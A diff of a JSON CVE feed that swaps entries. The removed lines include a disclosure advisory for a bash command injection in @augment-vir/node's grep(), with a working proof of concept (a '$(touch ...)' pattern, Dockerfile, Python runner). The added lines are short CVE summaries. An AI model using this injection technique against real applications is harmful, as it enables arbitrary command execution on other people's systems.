@@ -12,929 +12,914 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-63496",
-      "summary": "## Shell Command Injection in `grep()` via Unsanitized `searchPattern`\n\n### Summary\n\nThe `grep()` function exported by `@augment-vir/node` inserts caller-controlled search patterns directly into a double-quoted shell command string without sanitization (`grep.ts:310`). When the constructed command is passed to `spawn()` with `shell: 'bash'` (`shell.ts:98-99`), bash evaluates `$()` command substitution expressions embedded in the pattern, resulting in arbitrary OS command execution as the Node.js process user. Any downstream application that passes untrusted input to `grep()`'s `pattern` or `patterns` field is vulnerable to unauthenticated local (and potentially remote) code execution. CVSS Base Score: **7.8 (High)**.\n\n### Details\n\n**Root cause:** `packages/node/src/augments/fs/grep.ts:310` maps each search pattern into the shell fragment `-e \"${searchPattern}\"` with no sanitization:\n\n```ts\n// grep.ts:310\n...searchPatterns.map((searchPattern) => `-e \"${searchPattern}\"`),\n```\n\nThe resulting full command string is forwarded to `runShellCommand` (`grep.ts:320`), which calls `streamShellCommand` (`shell.ts:221-224`), which ultimately calls:\n\n```ts\n// shell.ts:98-99\nconst childProcess = spawn(command, {\n    shell,   // defaults to 'bash' (shell.ts:92)\n```\n\nBecause `shell` is `'bash'`, bash interprets `$()` within the double-quoted pattern as a command substitution and executes it before `grep` ever runs.\n\n**Incomplete sanitization:** An `escape()` helper exists at `grep.ts:178-180` but only replaces `\"` with `\\\"` and removes newlines. It is applied to `excludePatterns`, `excludeDirs`, and `includeFiles` (`grep.ts:297-308`) but **not** to `searchPatterns`. Even if it were applied, double-quote escaping does not prevent `$()` or backtick substitution inside bash double-quote contexts.\n\n**Data flow (source → sink):**\n\n| Step | Location | Description |\n|------|----------|-------------|\n| 1 | `packages/node/src/index.ts:3` | `export * from './augments/fs/grep.js'` — exposes `grep()` as a public npm API |\n| 2 | `packages/node/src/augments/fs/grep.ts:223-226` | `grep()` accepts caller-controlled `grepSearchPattern` and `grepSearchLocation` |\n| 3 | `packages/node/src/augments/fs/grep.ts:228` | `searchPatterns` derived from `grepSearchPattern.patterns \\|\\| [grepSearchPattern.pattern]` |\n| 4 | `packages/node/src/augments/fs/grep.ts:269-314` | `fullCommand` built as a plain shell string |\n| 5 | `packages/node/src/augments/fs/grep.ts:310` | **Sink:** `searchPattern` inserted as `` `-e \"${searchPattern}\"` `` — no escaping applied |\n| 6 | `packages/node/src/augments/fs/grep.ts:320` | `fullCommand` passed to `runShellCommand` |\n| 7 | `packages/node/src/augments/terminal/shell.ts:221-224` | Forwarded to `streamShellCommand` |\n| 8 | `packages/node/src/augments/terminal/shell.ts:98-99` | `spawn(command, { shell: 'bash' })` executes the constructed command string |\n\n**Suggested remediation:**\n\n```diff\na/packages/node/src/augments/fs/grep.ts\n+++ b/packages/node/src/augments/fs/grep.ts\n@@\n-function escape(input: string) {\n-    return input.replaceAll('\"', String.raw`\\\"`).replaceAll('\\n', '');\n+function shellQuote(input: string) {\n+    return `'${input.replaceAll(\"'\", String.raw`'\\''`).replaceAll('\\n', '')}'`;\n }\n@@\n-        ...searchPatterns.map((searchPattern) => `-e \"${searchPattern}\"`),\n+        ...searchPatterns.map((searchPattern) => `-e ${shellQuote(searchPattern)}`),\n+        '--',\n         ...searchParts,\n```\n\nAlternatively, replace the shell-string approach with `spawn('grep', args, { shell: false })` to avoid shell interpretation entirely.\n\n### PoC\n\n**Prerequisites:** Docker installed on the host. All steps run locally inside a container — no network exposure, no real credentials, no DoS.\n\n**Step 1 — Build the Docker image:**\n\n```bash\ndocker build -t augment-vir-vuln-001-poc \\\n  vuln-001\n```\n\n**Step 2 — Run the exploit container:**\n\n```bash\ndocker run --rm --name augment-vir-vuln-001-run augment-vir-vuln-001-poc\n```\n\n**Core exploit (`exploit.mjs` inside the container):**\n\n```js\nimport { grep } from '@augment-vir/node';\n\nawait grep(\n  { pattern: '$(touch /tmp/augment-vir-poc-triggered)no-match' },\n  { file: 'package.json' },\n);\n```\n\nThe `$()` shell substitution in the pattern causes bash to execute `touch /tmp/augment-vir-poc-triggered` before grep runs. The sentinel file is created even though the grep pattern itself matches nothing in `package.json`.\n\n**Expected output:**\n\n```\n[*] Calling grep() with injected $() command substitution pattern...\n[*] Pattern: $(touch /tmp/augment-vir-poc-triggered)no-match\n\n=== VULNERABLE ===\n[+] COMMAND INJECTION CONFIRMED: sentinel file exists at /tmp/augment-vir-poc-triggered\n[+] The $() substitution in pattern was executed by bash via spawn({shell:\"bash\"})\n```\n\n**Minimal reproduction without Docker:**\n\n```bash\nmkdir /tmp/av-grep-poc && cd /tmp/av-grep-poc\nnpm init -y\nnpm install @augment-vir/node@31.73.2\n\ncat > poc.mjs <<'EOF'\nimport { grep } from '@augment-vir/node';\nawait grep(\n  { pattern: '$(touch /tmp/augment-vir-grep-poc)no-match' },\n  { file: 'package.json' },\n);\nEOF\n\nrm -f /tmp/augment-vir-grep-poc\nnode poc.mjs\ntest -f /tmp/augment-vir-grep-poc && echo VULNERABLE\n```\n\n**Verification:** Both Phase 1 static analysis and Phase 2 dynamic reproduction confirmed the vulnerability. `VULNERABLE` and `COMMAND INJECTION CONFIRMED` were observed in stdout; the sentinel file `/tmp/augment-vir-poc-triggered` was created inside the Docker container.\n\n### Impact\n\nThis is an **OS Command Injection (CWE-78)** vulnerability. Any application that calls `@augment-vir/node`'s `grep()` with user-controlled input in the `pattern` or `patterns` field is vulnerable to arbitrary command execution under the Node.js process's user account.\n\n- **Confidentiality — High:** An attacker can read arbitrary files accessible to the process.\n- **Integrity — High:** An attacker can write or delete files, install malware, or modify application data.\n- **Availability — High:** An attacker can terminate processes or exhaust system resources.\n\nThe attack vector is classified as Local (the attacker must control the value passed to `pattern` at the library API level). In practice the severity escalates to Network-reachable if a web service or API maps any user-supplied string to the `grep()` `pattern` parameter. No authentication or special privileges are required; the function is exported from the package's main entry point and is enabled by default.\n\n### Reproduction artifacts\n\n#### `Dockerfile`\n\n```dockerfile\nFROM node:22-slim\n\n# Install grep (required by @augment-vir/node's grep() implementation)\nRUN apt-get update -qq && apt-get install -y --no-install-recommends grep && rm -rf /var/lib/apt/lists/*\n\nWORKDIR /poc\n\n# Initialize npm project and install the vulnerable package version\nRUN npm init -y && \\\n    npm install @augment-vir/node@31.73.2 --save 2>&1 | tail -5\n\n# Create the exploit script that demonstrates command injection via grep()\n# The pattern '$(touch /tmp/augment-vir-poc-triggered)no-match' is injected\n# into the shell command string without sanitization, causing $() substitution\n# to execute 'touch /tmp/augment-vir-poc-triggered' under bash.\nRUN cat > /poc/exploit.mjs << 'EOF'\nimport { grep } from '@augment-vir/node';\nimport { existsSync } from 'node:fs';\n\nconst SENTINEL_FILE = '/tmp/augment-vir-poc-triggered';\n\n// Remove sentinel file if it exists from a previous run\nimport { rmSync } from 'node:fs';\ntry { rmSync(SENTINEL_FILE); } catch {}\n\nconsole.log('[*] Calling grep() with injected $() command substitution pattern...');\nconsole.log('[*] Pattern: $(touch /tmp/augment-vir-poc-triggered)no-match');\n\ntry {\n  await grep(\n    { pattern: '$(touch /tmp/augment-vir-poc-triggered)no-match' },\n    { file: 'package.json' },\n  );\n} catch (err) {\n  // grep() may throw due to no matches — that is expected and irrelevant\n  console.log('[*] grep() threw (expected when no matches):', err?.message ?? err);\n}\n\nif (existsSync(SENTINEL_FILE)) {\n  console.log('');\n  console.log('=== VULNERABLE ===');\n  console.log('[+] COMMAND INJECTION CONFIRMED: sentinel file exists at', SENTINEL_FILE);\n  console.log('[+] The $() substitution in pattern was executed by bash via spawn({shell:\"bash\"})');\n  process.exit(0);\n} else {\n  console.log('');\n  console.log('=== NOT EXPLOITED ===');\n  console.log('[-] Sentinel file was NOT created — injection did not fire.');\n  process.exit(1);\n}\nEOF\n\nCMD [\"node\", \"/poc/exploit.mjs\"]\n```\n\n#### `poc.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC for VULN-001: Shell Command Injection in @augment-vir/node grep()\nCWE-78 — OS Command Injection\nAffected version: @augment-vir/node@31.73.2\n\nRoot cause:\n  packages/node/src/augments/fs/grep.ts:310 constructs a shell command string\n  using unsanitized caller-supplied searchPattern inside double quotes:\n    ...searchPatterns.map((searchPattern) => `-e \"${searchPattern}\"`)\n  This command string is passed to spawn(command, { shell: 'bash' }), meaning\n  $() command substitution in the pattern is executed by bash.\n\nSafe usage: This PoC runs entirely inside a local Docker container.\n            No external network attacks, no real credentials, no DoS.\n\"\"\"\n\nimport subprocess\nimport sys\nimport os\nimport json\n\nIMAGE_NAME = \"augment-vir-vuln-001-poc\"\nCONTAINER_NAME = \"augment-vir-vuln-001-run\"\nDOCKERFILE_DIR = os.path.dirname(os.path.abspath(__file__))\n\nBUILD_CMD = f\"docker build -t {IMAGE_NAME} {DOCKERFILE_DIR}\"\nRUN_CMD = f\"docker run --rm --name {CONTAINER_NAME} {IMAGE_NAME}\"\n\ndef run(cmd, **kwargs):\n    \"\"\"Run a shell command and return CompletedProcess.\"\"\"\n    print(f\"[cmd] {cmd}\")\n    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kwargs)\n\ndef main():\n    print(\"=\" * 60)\n    print(\"VULN-001 PoC: Shell Command Injection in grep()\")\n    print(\"Package: @augment-vir/node@31.73.2\")\n    print(\"=\" * 60)\n\n    # Step 1: Build Docker image\n    print(\"\\n[*] Building Docker image...\")\n    build_result = run(BUILD_CMD, timeout=300)\n    if build_result.returncode != 0:\n        print(\"[!] Docker build FAILED\")\n        print(build_result.stdout[-2000:] if build_result.stdout else \"\")\n        print(build_result.stderr[-2000:] if build_result.stderr else \"\")\n        write_result(\n            passed=False,\n            verdict=\"FAIL\",\n            reason=\"Docker 빌드 실패 — npm install 또는 네트워크 오류\",\n            evidence=build_result.stderr[-1000:],\n        )\n        sys.exit(1)\n    print(\"[+] Docker image built successfully\")\n\n    # Step 2: Run exploit container\n    print(\"\\n[*] Running exploit container...\")\n    run_result = run(RUN_CMD, timeout=120)\n\n    combined_output = run_result.stdout + run_result.stderr\n    print(combined_output)\n\n    # Step 3: Evaluate result\n    vulnerable = \"VULNERABLE\" in combined_output and \"COMMAND INJECTION CONFIRMED\" in combined_output\n\n    if vulnerable:\n        print(\"\\n[+] PASS — Command injection confirmed inside Docker container\")\n        print(\"[+] The $() substitution in grep() pattern was executed by bash\")\n        write_result(\n            passed=True,\n            verdict=\"PASS\",\n            reason=(\n                \"Docker 컨테이너 내에서 grep() 패턴에 포함된 $() 명령 치환이 bash에 의해 실행되었음을 확인. \"\n                \"sentinel 파일 /tmp/augment-vir-poc-triggered가 생성되었으며 stdout에서 'VULNERABLE' 및 \"\n                \"'COMMAND INJECTION CONFIRMED' 문자열이 관측됨.\"\n            ),\n            evidence=combined_output.strip()[-1500:],\n        )\n        sys.exit(0)\n    else:\n        print(\"\\n[-] FAIL — exploit did not produce expected output\")\n        write_result(\n            passed=False,\n            verdict=\"FAIL\",\n            reason=(\n                \"컨테이너 stdout에서 'VULNERABLE' 또는 'COMMAND INJECTION CONFIRMED'가 관측되지 않음. \"\n                \"sentinel 파일이 생성되지 않았거나 grep() 동작이 예상과 다를 수 있음.\"\n            ),\n            evidence=combined_output.strip()[-1500:],\n        )\n        sys.exit(1)\n\ndef write_result(passed, verdict, reason, evidence):\n    result = {\n        \"passed\": passed,\n        \"verdict\": verdict,\n        \"reason\": reason,\n        \"build_command\": BUILD_CMD,\n        \"run_command\": RUN_CMD,\n        \"poc_command\": f\"python3 {os.path.abspath(__file__)}\",\n        \"evidence\": evidence,\n        \"artifacts\": [\"Dockerfile\", \"poc.py\"],\n    }\n    out_path = os.path.join(DOCKERFILE_DIR, \"phase2_result.json\")\n    with open(out_path, \"w\", encoding=\"utf-8\") as f:\n        json.dump(result, f, ensure_ascii=False, indent=2)\n    print(f\"\\n[*] Result written to {out_path}\")\n\nif __name__ == \"__main__\":\n    main()\n```",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2026-11-18",
-      "modified": "2026-11-18",
-      "cwe": {
-        "cwe_id": "CWE-78",
-        "name": "Improper Neutralization of Special Elements used in an OS Command"
-      },
-      "references": [
-        "https://github.com/electrovir/augment-vir/security/advisories/GHSA-xvcc-vqjv-phqh",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-63496",
-        "https://github.com/electrovir/augment-vir/commit/9e1a3592903a56e500959be72276ede1708c3437",
-        "https://github.com/electrovir/augment-vir/releases/tag/v31.73.5",
-        "https://github.com/advisories/GHSA-xvcc-vqjv-phqh"
-      ],
-      "vulnerableProducts": [
-        "@augment-vir/node npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-61618",
-      "summary": "### Summary\nKZG accumulator public-instance limbs were decoded without consistently enforcing canonical limb bounds before reconstructing elliptic-curve coordinates.\n\nIn the generated EVM verifier, accumulator coordinates were reconstructed from public-instance limbs using shifted additions before point validation. The verifier checked the reconstructed point, but did not independently check that every limb was below the configured limb bound before reconstruction.\n\n### Details\n`PlonkProof::read` takes accumulator public-instance scalars selected by `accumulator_indices` and passes them into `AccumulatorEncoding::from_repr`. For the EVM loader, `LimbsEncoding::from_repr` forwards those limbs to `EvmLoader::ec_point_from_limbs`, where each coordinate was reconstructed with `shl` and `add` before `validate_ec_point` was applied. That validation checked the reconstructed affine point, not whether the original limb encoding was canonical.\n\nThe native verifier path had a related robustness issue: malformed accumulator limb encodings could reach assertion or unwrap-based decoding and panic instead of returning a verification error.\n\nThe affected code is in `snark-verifier/src/loader/evm/loader.rs` and `snark-verifier/src/pcs/kzg/accumulator.rs`, specifically `EvmLoader::ec_point_from_limbs` and `LimbsEncoding::from_repr`.\n\n### Impact\nFor standard SDK aggregation circuits, accumulator limbs are expected to be constrained by the circuit before reaching the verifier boundary, which limits practical exploitability. The missing verifier-side checks nevertheless allowed non-canonical encodings at the boundary, and the native verifier path could be crashed by malformed accumulator public inputs.",
-      "cvssScore": 6.9,
+      "id": "CVE-2026-116840",
+      "summary": "llama.cpp b5854 before b11275 contains an integer overflow vulnerability in gguf_init_from_reader that bypasses the CVE-2025-53630 size check when padding near-SIZE_MAX tensor sizes. Attackers can supply a crafted GGUF file whose tensor size pads to zero, causing an undersized data blob and out-of-bounds reads by consumers.",
+      "cvssScore": 6.1,
       "severity": "Medium",
-      "published": "2026-11-18",
-      "modified": "2026-11-18",
-      "cwe": {
-        "cwe_id": "CWE-20",
-        "name": "Improper Input Validation"
-      },
+      "published": "2026-10-27",
+      "modified": null,
+      "cwe": "CWE-190",
       "references": [
-        "https://github.com/axiom-crypto/snark-verifier/security/advisories/GHSA-265x-v3qf-ff6p",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-61618",
-        "https://github.com/axiom-crypto/snark-verifier/commit/d6aaf66d4706f5317cf61d5dbe00c14e7fbdbb70",
-        "https://github.com/axiom-crypto/snark-verifier/releases/tag/v0.2.5",
-        "https://github.com/advisories/GHSA-265x-v3qf-ff6p"
+        "https://github.com/ggml-org/llama.cpp/blob/v0.5.0/ggml/src/gguf.cpp#L794-L795",
+        "https://github.com/ggml-org/llama.cpp/commit/a6ea155d3d38b3f6f43d0c0dc29c2d592413ef44",
+        "https://github.com/ggml-org/llama.cpp/issues/26978",
+        "https://github.com/ggml-org/llama.cpp/pull/26979",
+        "https://github.com/ggml-org/llama.cpp/releases/tag/b11275"
       ],
-      "vulnerableProducts": [
-        "snark-verifier rust"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "GHSA-CQR8-874Q-2G4R",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-11-18",
-      "modified": "2026-11-18",
+      "id": "CVE-2026-116839",
+      "summary": "A malicious actor who lures an authenticated user to a malicious page could exploit a Cross-Site Request Forgery (CSRF) vulnerability found in airMAX M devices to make unauthorized changes and execute a Denial of Service (DoS) attack on the device.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-10-27",
+      "modified": null,
+      "cwe": "CWE-352",
+      "references": [
+        "https://uisp.community.ui.com/releases/Security-Advisory-Bulletin-071/7d4d42cf-09e4-44d3-9c19-649cac8c6af3"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1245",
+      "summary": "index2.php in Mambo 4.0.12 allows remote attackers to gain administrator access via a URL request where session_id is set to the MD5 hash of a session cookie.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "2003-12-31",
+      "modified": null,
       "cwe": null,
       "references": [
-        "https://github.com/advisories/GHSA-cqr8-874q-2g4r"
+        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0302.html",
+        "http://www.securityfocus.com/bid/6926",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11398",
+        "http://archives.neohapsis.com/archives/bugtraq/2003-02/0302.html",
+        "http://www.securityfocus.com/bid/6926"
       ],
-      "vulnerableProducts": [
-        "create-saint npm"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0576",
-      "summary": "lpusers as included with SCO OpenServer 5.0 through 5.0.6 allows a  local attacker to gain additional privileges via a buffer overflow attack in the '-u' command line parameter.",
-      "cvssScore": 4.6,
+      "id": "CVE-2003-1246",
+      "summary": "NtCreateSymbolicLinkObject in ntdll.dll in Integrity Protection Driver (IPD) 1.2 and 1.3 allows local users to create and overwrite arbitrary files via a symlink attack on \\winnt\\system32\\drivers using the subst command.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2003-01/0017.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2003-01/0018.html",
+        "http://www.iss.net/security_center/static/10979.php",
+        "http://www.securityfocus.com/bid/6511",
+        "http://archives.neohapsis.com/archives/bugtraq/2003-01/0017.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1247",
+      "summary": "Multiple buffer overflows in H-Sphere WebShell 2.3 allow remote attackers to execute arbitrary code via (1) a long URL content type in CGI::readFile, (2) a long path in diskusage, and (3) a long fname in flist.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://psoft.net/misc/webshell_patch.html",
+        "http://secunia.com/advisories/7832",
+        "http://www.iss.net/security_center/static/10999.php",
+        "http://www.iss.net/security_center/static/11002.php",
+        "http://www.iss.net/security_center/static/11003.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1248",
+      "summary": "H-Sphere WebShell 2.3 allows remote attackers to execute arbitrary commands via shell metacharacters in the (1) mode and (2) zipfile parameters in a URL request.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://psoft.net/misc/webshell_patch.html",
+        "http://www.iss.net/security_center/static/11001.php",
+        "http://www.securityfocus.com/archive/1/305313",
+        "http://www.securityfocus.com/bid/6537",
+        "http://www.securityfocus.com/bid/6539"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0422",
+      "summary": "flim before 1.14.3 creates temporary files insecurely, which allows local users to overwrite arbitrary files of the Emacs user via a symlink attack.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-07-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2004/dsa-500",
+        "http://www.redhat.com/support/errata/RHSA-2004-344.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/16027",
+        "http://www.debian.org/security/2004/dsa-500",
+        "http://www.redhat.com/support/errata/RHSA-2004-344.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-0423",
+      "summary": "The log_event function in ssmtp 2.50.6 and earlier allows local users to overwrite arbitrary files via a symlink attack on the ssmtp.log temporary log file.",
+      "cvssScore": 2.1,
+      "severity": "Low",
+      "published": "2004-07-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108239608131119&w=2",
+        "http://marc.info/?l=bugtraq&m=108239608131119&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1241",
+      "summary": "Un-CGI 1.9 and earlier does not verify that a CGI script has the execution bits set before executing it, which allows remote attackers to execute arbitrary commands by directing Un-CGI to a document that begins with \"#!\"  and the desired program name.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-07-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0287.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0349.html",
+        "http://www.iss.net/security_center/static/6847.php",
+        "http://www.midwinter.com/~koreth/uncgi-changes.html",
+        "http://www.midwinter.com/~koreth/uncgi.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1242",
+      "summary": "Directory traversal vulnerability in Un-CGI 1.9 and earlier allows remote attackers to execute arbitrary code via a .. (dot dot) in an HTML form.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2001-07-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0287.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2001-07/0349.html",
+        "http://www.iss.net/security_center/static/6846.php",
+        "http://www.midwinter.com/~koreth/uncgi-changes.html",
+        "http://www.securityfocus.com/bid/3056"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0649",
+      "summary": "Buffer overflow in xpcd-svga for xpcd 2.08 and earlier allows local users to execute arbitrary code via a long HOME environment variable.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2003-08-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.debian.org/security/2003/dsa-368",
+        "http://www.mandriva.com/security/advisories?name=MDKSA-2004:053",
+        "http://www.debian.org/security/2003/dsa-368",
+        "http://www.mandriva.com/security/advisories?name=MDKSA-2004:053"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-1294",
+      "summary": "Buffer overflow in A-V Tronics Inetserv 3.2.1 and earlier allows remote attackers to cause a denial of service (crash) in the Webmail interface via a long username and password.",
+      "cvssScore": 5,
       "severity": "Medium",
       "published": "2001-08-22",
       "modified": null,
-      "cwe": "CWE-119",
+      "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0407.html",
-        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6292",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-03/0407.html",
-        "http://security-archive.merton.ox.ac.uk/bugtraq-200104/0221.html"
+        "http://www.iss.net/security_center/static/7022.php",
+        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0001&L=ntbugtraq&F=P&S=&P=4592",
+        "http://www.securityfocus.com/bid/3224",
+        "http://www.iss.net/security_center/static/7022.php",
+        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0001&L=ntbugtraq&F=P&S=&P=4592"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1018",
-      "summary": "Lotus Domino web server 5.08 allows remote attackers to determine the internal IP address of the server when NAT is enabled via a GET request that contains a long sequence of / (slash) characters.",
+      "id": "CVE-2001-0861",
+      "summary": "Cisco 12000 with IOS 12.0 and line cards based on Engine 2 and earlier allows remote attackers to cause a denial of service (CPU consumption) by flooding the router with traffic that generates a large number of ICMP Unreachable replies.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-09-20",
+      "published": "2001-12-06",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=100094373621813&w=2",
-        "http://www.securityfocus.com/bid/3350",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7180",
-        "http://marc.info/?l=bugtraq&m=100094373621813&w=2",
-        "http://www.securityfocus.com/bid/3350"
+        "http://www.ciac.org/ciac/bulletins/m-018.shtml",
+        "http://www.cisco.com/warp/public/707/GSR-unreachables-pub.shtml",
+        "http://www.osvdb.org/794",
+        "http://www.securityfocus.com/bid/3534",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7536"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-1029",
-      "summary": "libutil in OpenSSH on FreeBSD 4.4 and earlier does not drop privileges before verifying the capabilities for reading the copyright and welcome files, which allows local users to bypass the capabilities checks and read arbitrary files by specifying alternate copyright or welcome files.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2001-09-20",
-      "modified": null,
+      "id": "CVE-2026-64838",
+      "summary": "ICEcoder versions through 8.1 fail to properly validate the oldFileName parameter in file move and rename operations, allowing authenticated users to relocate files from outside the document root. Attackers can use path traversal sequences in oldFileName to move files writable by the PHP process into the web-accessible project directory, disclosing file contents and deleting originals.",
+      "cvssScore": 5.3,
+      "severity": "Medium",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2001-09/0173.html",
-        "http://www.osvdb.org/6073",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8697",
-        "http://archives.neohapsis.com/archives/bugtraq/2001-09/0173.html",
-        "http://www.osvdb.org/6073"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-64838",
+        "https://github.com/Caycon/cve-advisories/blob/main/2026/ICEcoder/CVE-2026-64838.md",
+        "https://github.com/icecoder/ICEcoder",
+        "https://github.com/icecoder/ICEcoder/blob/4a61847ef7bb0360735cf1d55c45e5de9746e24e/lib/file-control.php#L198",
+        "https://www.vulncheck.com/advisories/icecoder-through-8.1-path-traversal-via-oldfilename-parameter"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0940",
-      "summary": "Buffer overflow in the GUI authentication code of Check Point VPN-1/FireWall-1 Management Server 4.0 and 4.1 allows remote attackers to execute arbitrary code via a long user name.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-09-21",
+      "id": "CVE-2003-0044",
+      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in the (1) examples and (2) ROOT web applications for Jakarta Tomcat 3.x through 3.3.1a allow remote attackers to insert arbitrary web script or HTML.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2003-02-07",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/win2ksecadvice/2001-q3/0151.html",
-        "http://cert.uni-stuttgart.de/archive/bugtraq/2001/11/msg00291.html",
-        "http://marc.info/?l=bugtraq&m=100094268017271&w=2",
-        "http://marc.info/?l=bugtraq&m=100698954308436&w=2",
-        "http://www.checkpoint.com/techsupport/alerts/buffer_overflow.html"
+        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/",
+        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/RELEASE-NOTES-3.3.1a.txt",
+        "http://secunia.com/advisories/7972",
+        "http://www.ciac.org/ciac/bulletins/n-060.shtml",
+        "http://www.debian.org/security/2003/dsa-246"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0757",
-      "summary": "Heap-based buffer overflow in the SendUidl in the POP3 capability for Mozilla before 1.7, Firefox before 0.9, and Thunderbird before 0.7, may allow remote POP3 mail servers to execute arbitrary code.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2004-08-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenServer/SCOSA-2005.49/SCOSA-2005.49.txt",
-        "http://bugzilla.mozilla.org/show_bug.cgi?id=229374",
-        "http://marc.info/?l=bugtraq&m=109900315219363&w=2",
-        "http://secunia.com/advisories/10856",
-        "http://www.kb.cert.org/vuls/id/561022"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0758",
-      "summary": "Mozilla 1.5 through 1.7 allows a CA certificate to be imported even when their DN is the same as that of the built-in CA root certificate, which allows remote attackers to cause a denial of service to SSL pages because the malicious certificate is treated as invalid.",
+      "id": "CVE-2003-0045",
+      "summary": "Jakarta Tomcat before 3.3.1a on certain Windows systems may allow remote attackers to cause a denial of service (thread hang and resource consumption) via a request for a JSP page containing an MS-DOS device name, such as aux.jsp.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-08-18",
+      "published": "2003-02-07",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://ftp.sco.com/pub/updates/OpenServer/SCOSA-2005.49/SCOSA-2005.49.txt",
-        "http://bugzilla.mozilla.org/show_bug.cgi?id=249004",
-        "http://marc.info/?l=bugtraq&m=109900315219363&w=2",
-        "http://www.gentoo.org/security/en/glsa/glsa-200408-22.xml",
-        "http://www.kb.cert.org/vuls/id/784278"
+        "http://jakarta.apache.org/builds/jakarta-tomcat/release/v3.3.1a/RELEASE-NOTES-3.3.1a.txt",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12102",
